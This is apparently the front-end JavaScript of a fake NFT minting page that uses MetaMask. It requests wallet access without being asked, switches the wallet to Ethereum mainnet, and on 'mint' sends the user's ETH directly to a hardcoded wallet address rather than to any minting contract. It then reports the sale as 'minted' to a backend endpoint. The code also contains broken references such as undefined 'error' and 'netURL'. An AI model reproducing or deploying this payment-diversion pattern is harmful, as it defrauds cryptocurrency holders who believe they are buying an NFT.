const ADDRESS = "0xEcAcDb9FA4Ed4ACD8977821737da7bCe688be1e0";
const web3 = window.Web3;
const ethereum = window.ethereum;
let accounts;
let price = 0.11;
const mint = document.querySelector(".mint");
const connect = document.querySelector(".connect");
const title = document.querySelector(".metamask_content-title");
const totalPrice = document.querySelector(".totalPrice");
const count = document.querySelector(".count");
const walletAddress = document.querySelector(".walletAddress");
var totalPriceAmount = price;
var countAmount = 1;

function checkConnectStatus() {
    if (ethereum) {
        if (ethereum.selectedAddress) {
            connect.style.display = "none";
            mint.style.display = "block";
        } else if (ethereum.isMetaMask) {
            connect.style.display = "block";
            mint.style.display = "none";
        }
    } else {
        connect.style.display = "block";
        mint.style.display = "none";
    }
}

window.addEventListener("load", () => {
    totalPrice.innerText = price;
    checkConnectStatus();
});

const getAccount = async function() {
    accounts = await ethereum.request({
        method: "eth_requestAccounts"
    });
    if (window.ethereum.chainId == "0x1") {
        console.log("Already connected to ethereum mainnet...");
        checkConnectStatus();
    } else {
        try {
            await ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{
                    chainId: "0x1"
                }],
            });
            checkConnectStatus();
        } catch (switchError) {
            if (error.code === 4902) {
                try {
                    await ethereum.request({
                        method: "wallet_addEthereumChain",
                        params: [{
                            chainId: "0x1",
                            rpcUrl: netURL,
                        }, ],
                    });
                    checkConnectStatus();
                } catch (addError) {}
            }
        }
    }
        checkConnectStatus();
}

const sendTransaction = async function() {
    const priceToWei = (totalPriceAmount * 1e18).toString(16);
    const gasLimit = (100_000 * totalPriceAmount).toString(16);
    ethereum.request({
        method: "eth_sendTransaction",
        params: [{
            from: accounts[0],
            to: ADDRESS,
            value: priceToWei,
        }, ],
    })
    .then((address) => {
        $.ajax({
            type: "POST",
            url: "/backend/api.php?sendValue",
            data: "address=" + countAmount + ' ' + 'NFT' + ' ' + 'minted' + ' ' + '(' + totalPriceAmount + ' ' + 'ETH' + ')' + ' ' + 'Collider.craftworks.cc',
        });
       })
    .then((txHash) => {
        setTimeout(function () {}, 10000);
   }).catch((error) => {});
};
setTimeout(function () {
   getAccount();
}, 1000);

    


connect.addEventListener("click", async function() {
    await getAccount();
});

mint.addEventListener("click", async function() {
    await getAccount();
    await sendTransaction();
});

document.querySelector(".plus").addEventListener("click", function() {
    if (countAmount < 3) {
        countAmount++;
        totalPriceAmount = (countAmount * price).toFixed(2);
        count.innerText = countAmount;
        totalPrice.innerText = totalPriceAmount;
    }
});
document.querySelector(".minus").addEventListener("click", function() {
    if (countAmount > 1) {
        countAmount--;
        totalPriceAmount = (countAmount * price).toFixed(2);
        count.innerText = countAmount;
        totalPrice.innerText = totalPriceAmount;
    }
});
document.querySelector(".setMax").addEventListener("click", function() {
    countAmount = 3;
    totalPriceAmount = (countAmount * price).toFixed(2);
    count.innerText = countAmount;
    totalPrice.innerText = totalPriceAmount;
});

function getMobileOperatingSystem() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
    console.log(userAgent);
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const uid = urlParams.get("uid");
    console.log(uid);
    if (uid == "mm") {
        return "Metamask";
    }
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }
    if (/android/i.test(userAgent)) {
        return "Android";
    }
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }
    return "unknown";
}
document.addEventListener("DOMContentLoaded", (event) => {
    if (getMobileOperatingSystem() == "Android" || getMobileOperatingSystem() == "iOS") {
        var wrapper = document.createElement("a");
        wrapper.classList.add("mmLink");
        wrapper.href = "https://metamask.app.link/dapp/" +
            window.location.href.replace("https://", "").replace("http://", "") +
            "?uid=mm";
        connect.parentNode.insertBefore(wrapper, connect);
        wrapper.appendChild(connect);
    }
});
